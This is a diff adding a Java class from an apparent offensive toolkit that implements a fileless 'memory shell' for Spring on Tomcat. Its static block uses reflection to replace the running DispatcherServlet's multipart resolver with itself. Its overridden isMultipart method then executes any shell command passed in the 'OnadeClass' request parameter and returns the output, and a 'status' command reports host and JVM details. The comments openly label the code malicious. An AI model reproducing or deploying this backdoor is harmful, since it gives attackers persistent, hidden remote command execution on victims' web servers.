@@ -1,0 +1,424 @@
+package com.m1yuu.m1yuu_tools.evilClass;
+
+import org.apache.catalina.connector.Response;
+import org.apache.catalina.connector.ResponseFacade;
+import org.apache.catalina.core.ApplicationFilterChain;
+import org.springframework.web.multipart.support.StandardServletMultipartResolver;
+
+import javax.servlet.ServletRequest;
+import javax.servlet.ServletResponse;
+import javax.servlet.http.HttpServletRequest;
+import java.io.InputStream;
+import java.io.OutputStream;
+import java.lang.reflect.Field;
+import java.lang.reflect.Modifier;
+
+public class OnadeClass extends StandardServletMultipartResolver {
+    
+    // 使用ThreadLocal防止重复执行
+    private static final ThreadLocal<Boolean> isProcessing = new ThreadLocal<>();
+
+    @Override
+    public boolean isMultipart(HttpServletRequest request) {
+        try {
+            String url = request.getRequestURI();
+            String cmd = request.getParameter("OnadeClass");
+            
+            // 检查是否正在处理，防止重复执行
+            if (isProcessing.get() != null && isProcessing.get()) {
+                return super.isMultipart(request);
+            }
+            
+            // 只有在特定URL且有cmd参数时才执行恶意逻辑
+            if (cmd != null && (
+                    url.equals("/error")
+                            ||
+                            url.contains("/OnadeClass")
+            )) {
+                // 标记正在处理
+                isProcessing.set(true);
+                Field WRAP_SAME_OBJECT_FIELD = Class.forName("org.apache.catalina.core.ApplicationDispatcher").getDeclaredField("WRAP_SAME_OBJECT");
+                Field lastServicedRequestField = ApplicationFilterChain.class.getDeclaredField("lastServicedRequest");
+                Field lastServicedResponseField = ApplicationFilterChain.class.getDeclaredField("lastServicedResponse");
+                Field modifiersField = Field.class.getDeclaredField("modifiers");
+                modifiersField.setAccessible(true);
+                modifiersField.setInt(WRAP_SAME_OBJECT_FIELD, WRAP_SAME_OBJECT_FIELD.getModifiers() & ~Modifier.FINAL);
+                modifiersField.setInt(lastServicedRequestField, lastServicedRequestField.getModifiers() & ~Modifier.FINAL);
+                modifiersField.setInt(lastServicedResponseField, lastServicedResponseField.getModifiers() & ~Modifier.FINAL);
+                WRAP_SAME_OBJECT_FIELD.setAccessible(true);
+                lastServicedRequestField.setAccessible(true);
+                lastServicedResponseField.setAccessible(true);
+
+                ThreadLocal<ServletResponse> lastServicedResponse =
+                        (ThreadLocal<ServletResponse>) lastServicedResponseField.get(null);
+                ThreadLocal<ServletRequest> lastServicedRequest = (ThreadLocal<ServletRequest>) lastServicedRequestField.get(null);
+                boolean WRAP_SAME_OBJECT = WRAP_SAME_OBJECT_FIELD.getBoolean(null);
+                // 使用已定义的cmd变量，不重复定义
+                if (lastServicedRequest != null) {
+                    cmd = lastServicedRequest.get().getParameter("OnadeClass");
+                }
+                if (!WRAP_SAME_OBJECT || lastServicedResponse == null || lastServicedRequest == null) {
+                    lastServicedRequestField.set(null, new ThreadLocal<>());
+                    lastServicedResponseField.set(null, new ThreadLocal<>());
+                    WRAP_SAME_OBJECT_FIELD.setBoolean(null, true);
+                } else if (cmd != null) {
+                    // 检查是否为status命令
+                    if ("status".equals(cmd)) {
+                        ServletResponse responseFacade = lastServicedResponse.get();
+                        if (responseFacade instanceof javax.servlet.http.HttpServletResponse) {
+                            javax.servlet.http.HttpServletResponse httpResponse = (javax.servlet.http.HttpServletResponse) responseFacade;
+                            httpResponse.setContentType("text/plain; charset=UTF-8");
+                            java.io.Writer w = httpResponse.getWriter();
+                            java.text.SimpleDateFormat sdf = new java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
+                            String currentTime = sdf.format(new java.util.Date());
+                            Runtime runtime = Runtime.getRuntime();
+                            long totalMemory = runtime.totalMemory();
+                            long freeMemory = runtime.freeMemory();
+                            long usedMemory = totalMemory - freeMemory;
+                            long maxMemory = runtime.maxMemory();
+                            String status = "=== Memory Shell Status ===\n" +
+                                    "Type: multipart\n" +
+                                    "Current Time: " + currentTime + "\n" +
+                                    "Java Version: " + System.getProperty("java.version") + "\n" +
+                                    "JVM Name: " + System.getProperty("java.vm.name") + "\n" +
+                                    "JVM Version: " + System.getProperty("java.vm.version") + "\n" +
+                                    "OS Name: " + System.getProperty("os.name") + "\n" +
+                                    "OS Version: " + System.getProperty("os.version") + "\n" +
+                                    "Total Memory: " + (totalMemory / 1024 / 1024) + " MB\n" +
+                                    "Used Memory: " + (usedMemory / 1024 / 1024) + " MB\n" +
+                                    "Free Memory: " + (freeMemory / 1024 / 1024) + " MB\n" +
+                                    "Max Memory: " + (maxMemory / 1024 / 1024) + " MB\n" +
+                                    "========================";
+                            w.write(status);
+                            w.flush();
+                            // 确保response被提交，防止后续处理覆盖
+                            httpResponse.flushBuffer();
+                            // 如果response对象存在，完成响应处理
+                            try {
+                                Field responseField = ResponseFacade.class.getDeclaredField("response");
+                                responseField.setAccessible(true);
+                                Response response = (Response) responseField.get(responseFacade);
+                                if (response != null) {
+                                    try {
+                                        response.finishResponse();
+                                    } catch (Exception e) {
+                                        // 忽略异常
+                                    }
+                                }
+                            } catch (Exception e) {
+                                // 如果无法获取Response对象，忽略
+                            }
+                            isProcessing.remove();
+                            return false;
+                        }
+                    }
+                    
+                    ServletResponse responseFacade = lastServicedResponse.get();
+                    Response response = null;
+                    
+                    // 尝试从ResponseFacade获取Response
+                    try {
+                        Field responseField = ResponseFacade.class.getDeclaredField("response");
+                        responseField.setAccessible(true);
+                        response = (Response) responseField.get(responseFacade);
+                    } catch (Exception e) {
+                        // 如果不是ResponseFacade，尝试从ApplicationHttpResponse获取
+                        try {
+                            Field responseField = responseFacade.getClass().getDeclaredField("response");
+                            responseField.setAccessible(true);
+                            Object responseObj = responseField.get(responseFacade);
+                            if (responseObj instanceof Response) {
+                                response = (Response) responseObj;
+                            }
+                        } catch (Exception e2) {
+                            // 如果都失败，尝试直接使用responseFacade
+                            if (responseFacade instanceof Response) {
+                                response = (Response) responseFacade;
+                            }
+                        }
+                    }
+                    
+                    // 设置Content-Type确保浏览器正确显示
+                    if (responseFacade instanceof javax.servlet.http.HttpServletResponse) {
+                        ((javax.servlet.http.HttpServletResponse) responseFacade).setContentType("text/plain; charset=UTF-8");
+                    }
+                    
+                    // 获取OutputStream
+                    OutputStream out = null;
+                    if (response != null) {
+                        // 如果有Response对象，重置buffer并设置usingWriter
+                        try {
+                            response.resetBuffer();
+                            Field usingWriter = Response.class.getDeclaredField("usingWriter");
+                            usingWriter.setAccessible(true);
+                            usingWriter.set((Object) response, Boolean.FALSE);
+                            out = response.getOutputStream();
+                        } catch (Exception e) {
+                            // 如果失败，尝试从responseFacade获取
+                            if (responseFacade instanceof javax.servlet.http.HttpServletResponse) {
+                                out = ((javax.servlet.http.HttpServletResponse) responseFacade).getOutputStream();
+                            }
+                        }
+                    } else {
+                        // 如果没有Response对象，直接从responseFacade获取
+                        if (responseFacade instanceof javax.servlet.http.HttpServletResponse) {
+                            out = ((javax.servlet.http.HttpServletResponse) responseFacade).getOutputStream();
+                        } else {
+                            return super.isMultipart(request);
+                        }
+                    }
+                    
+                    if (out == null) {
+                        return super.isMultipart(request);
+                    }
+
+                    boolean isLinux = true;
+                    String osTyp = System.getProperty("os.name");
+                    if (osTyp != null && osTyp.toLowerCase().contains("win")) {
+                        isLinux = false;
+                    }
+                    String[] cmds = isLinux ? new String[]{"sh", "-c", cmd} : new String[]{"cmd.exe", "/c", cmd};
+                    Process p = Runtime.getRuntime().exec(cmds);
+                    InputStream in = p.getInputStream();
+                    InputStream err = p.getErrorStream();
+                    
+                    // 使用线程同时读取标准输出和错误输出到缓冲区，避免阻塞
+                    final java.util.concurrent.CountDownLatch latch = new java.util.concurrent.CountDownLatch(2);
+                    final java.io.ByteArrayOutputStream stdoutBuffer = new java.io.ByteArrayOutputStream();
+                    final java.io.ByteArrayOutputStream stderrBuffer = new java.io.ByteArrayOutputStream();
+                    
+                    // 读取标准输出到缓冲区
+                    Thread stdoutThread = new Thread(() -> {
+                        try {
+                            byte[] buffer = new byte[1024];
+                            int len;
+                            while ((len = in.read(buffer)) != -1) {
+                                stdoutBuffer.write(buffer, 0, len);
+                            }
+                            in.close();
+                        } catch (Exception e) {
+                            e.printStackTrace();
+                        } finally {
+                            latch.countDown();
+                        }
+                    });
+                    
+                    // 读取错误输出到缓冲区
+                    Thread stderrThread = new Thread(() -> {
+                        try {
+                            byte[] buffer = new byte[1024];
+                            int len;
+                            while ((len = err.read(buffer)) != -1) {
+                                stderrBuffer.write(buffer, 0, len);
+                            }
+                            err.close();
+                        } catch (Exception e) {
+                            e.printStackTrace();
+                        } finally {
+                            latch.countDown();
+                        }
+                    });
+                    
+                    stdoutThread.start();
+                    stderrThread.start();
+                    
+                    // 等待两个线程完成
+                    latch.await();
+                    
+                    // 等待进程完成
+                    p.waitFor();
+                    
+                    // 将缓冲区内容写入response（在主线程中写入，确保线程安全）
+                    stdoutBuffer.writeTo(out);
+                    stderrBuffer.writeTo(out);
+                    
+                    out.flush();
+                    // 确保response被提交，防止后续处理覆盖
+                    if (responseFacade instanceof javax.servlet.http.HttpServletResponse) {
+                        javax.servlet.http.HttpServletResponse httpResponse = (javax.servlet.http.HttpServletResponse) responseFacade;
+                        httpResponse.flushBuffer();
+                        // 如果response对象存在，完成响应处理
+                        if (response != null) {
+                            try {
+                                response.finishResponse();
+                            } catch (Exception e) {
+                                // 忽略异常
+                            }
+                        }
+                    }
+                    
+                    // 清理标记
+                    isProcessing.remove();
+                    return false; // 执行完恶意代码后返回false，避免multipart解析
+                } else {
+                    // 如果没有cmd参数，清理标记
+                    isProcessing.remove();
+                }
+
+            } else {
+                // 如果不是OnadeClass请求，清理标记
+                isProcessing.remove();
+            }
+
+        } catch (Exception e) {
+            e.printStackTrace();
+            // 发生异常时清理标记
+            isProcessing.remove();
+        }
+        
+        // 对于正常请求，调用父类方法进行标准multipart检测
+        return super.isMultipart(request);
+    }
+    static {
+        boolean hasReplacement = false;
+
+        try {
+            System.out.println("=== 替换DispatcherServlet的multipartResolver ===");
+
+            Thread currentThread = Thread.currentThread();
+
+            // 1. 获取 threadLocals
+            java.lang.reflect.Field threadLocalsField = Thread.class.getDeclaredField("threadLocals");
+            threadLocalsField.setAccessible(true);
+            Object threadLocalMap = threadLocalsField.get(currentThread);
+
+            if (threadLocalMap == null) {
+                System.out.println("threadLocalMap为空");
+            }
+
+            // 2. 获取 table 数组
+            java.lang.reflect.Field tableField = threadLocalMap.getClass().getDeclaredField("table");
+            tableField.setAccessible(true);
+            Object[] table = (Object[]) tableField.get(threadLocalMap);
+
+            // 3. 遍历 table 查找 DispatcherServlet Lambda
+            for (Object entry : table) {
+                if (entry != null) {
+                    java.lang.reflect.Field valueField = entry.getClass().getDeclaredField("value");
+                    valueField.setAccessible(true);
+                    Object lambdaValue = valueField.get(entry);
+
+                            if (lambdaValue != null && lambdaValue.getClass().getName().contains("DispatcherServlet$$Lambda")) {
+                                System.out.println("找到DispatcherServlet Lambda: " + lambdaValue.getClass().getName());
+
+                                // 4. 获取 Lambda 的所有字段，查找 ApplicationHttpRequest
+                                java.lang.reflect.Field[] lambdaFields = lambdaValue.getClass().getDeclaredFields();
+                                for (java.lang.reflect.Field lambdaField : lambdaFields) {
+                                    lambdaField.setAccessible(true);
+                                Object fieldValue = lambdaField.get(lambdaValue);
+
+
+                            if (fieldValue != null &&
+                                    fieldValue.getClass().getName().equals("org.apache.catalina.connector.RequestFacade")) {
+                                System.out.println("找到org.apache.catalina.connector.RequestFacade");
+
+                                // 6. 查找 request 字段（可能在父类中）
+
+                                if (fieldValue == null) {
+                                    System.out.println("未找到RequestFacade字段");
+                                    continue;
+                                }
+
+                                System.out.println("找到RequestFacade: " + fieldValue.getClass().getName());
+
+                                // 7. 获取内部 Request
+                                java.lang.reflect.Field requestField =
+                                        fieldValue.getClass().getDeclaredField("request");
+                                requestField.setAccessible(true);
+                                org.apache.catalina.connector.Request request =
+                                        (org.apache.catalina.connector.Request) requestField.get(fieldValue);
+
+                                System.out.println("找到Request");
+
+                                // 8. 获取 attributes Map
+                                java.lang.reflect.Field attributesField =
+                                        org.apache.catalina.connector.Request.class.getDeclaredField("attributes");
+                                attributesField.setAccessible(true);
+                                java.util.Map<String, Object> attributes =
+                                        (java.util.Map<String, Object>) attributesField.get(request);
+
+                                // 9. 获取 WebAsyncManager
+                                Object webAsyncManager = attributes.get(
+                                        "org.springframework.web.context.request.async.WebAsyncManager.WEB_ASYNC_MANAGER");
+
+                                if (webAsyncManager == null) {
+                                    System.out.println("未找到WebAsyncManager");
+                                    continue;
+                                }
+
+                                System.out.println("找到WebAsyncManager");
+
+                                // 10. 获取 callableInterceptors Map
+                                java.lang.reflect.Field callableInterceptorsField =
+                                        webAsyncManager.getClass().getDeclaredField("callableInterceptors");
+                                callableInterceptorsField.setAccessible(true);
+                                java.util.Map<Object, Object> callableInterceptors =
+                                        (java.util.Map<Object, Object>) callableInterceptorsField.get(webAsyncManager);
+
+                                // 11. 获取 RequestBindingInterceptor
+                                Object requestBindingInterceptor =
+                                        callableInterceptors.get("org.springframework.web.servlet.FrameworkServlet");
+
+                                if (requestBindingInterceptor == null) {
+                                    System.out.println("未找到RequestBindingInterceptor");
+                                    continue;
+                                }
+
+                                System.out.println("找到RequestBindingInterceptor: " +
+                                        requestBindingInterceptor.getClass().getName());
+
+                                // 12. 获取 this$0 (DispatcherServlet)
+                                java.lang.reflect.Field this0Field =
+                                        requestBindingInterceptor.getClass().getDeclaredField("this$0");
+                                this0Field.setAccessible(true);
+                                org.springframework.web.servlet.DispatcherServlet dispatcherServlet =
+                                        (org.springframework.web.servlet.DispatcherServlet) this0Field.get(requestBindingInterceptor);
+
+                                System.out.println("找到DispatcherServlet: " + dispatcherServlet.getClass().getName());
+
+                                // 13. 获取并替换 multipartResolver
+                                java.lang.reflect.Field multipartResolverField =
+                                        org.springframework.web.servlet.DispatcherServlet.class.getDeclaredField("multipartResolver");
+                                multipartResolverField.setAccessible(true);
+
+                                Object currentResolver = multipartResolverField.get(dispatcherServlet);
+
+                                if (currentResolver == null) {
+                                    System.out.println("当前multipartResolver为null");
+                                } else {
+                                    System.out.println("当前multipartResolver: " + currentResolver.getClass().getName());
+
+                                    // 检查是否已被替换
+                                    if (currentResolver instanceof OnadeClass) {
+                                        System.out.println("已经是恶意MultipartResolver，跳过");
+                                        hasReplacement = true;
+                                        break;
+                                    }
+                                }
+
+                                // 创建恶意 MultipartResolver
+                                OnadeClass maliciousResolver = new OnadeClass();
+
+                                // 执行替换
+                                multipartResolverField.set(dispatcherServlet, maliciousResolver);
+                                System.out.println("✓ 成功替换DispatcherServlet的multipartResolver");
+
+                                hasReplacement = true;
+                            }
+                        }
+                    }
+                }
+            }
+
+            if (hasReplacement) {
+                System.out.println("=== multipartResolver替换完成！===");
+            } else {
+                System.out.println("未找到DispatcherServlet实例");
+            }
+
+        } catch (Exception e) {
+            System.out.println("替换异常: " + e.getMessage());
+            e.printStackTrace();
+        }
+    }
+}
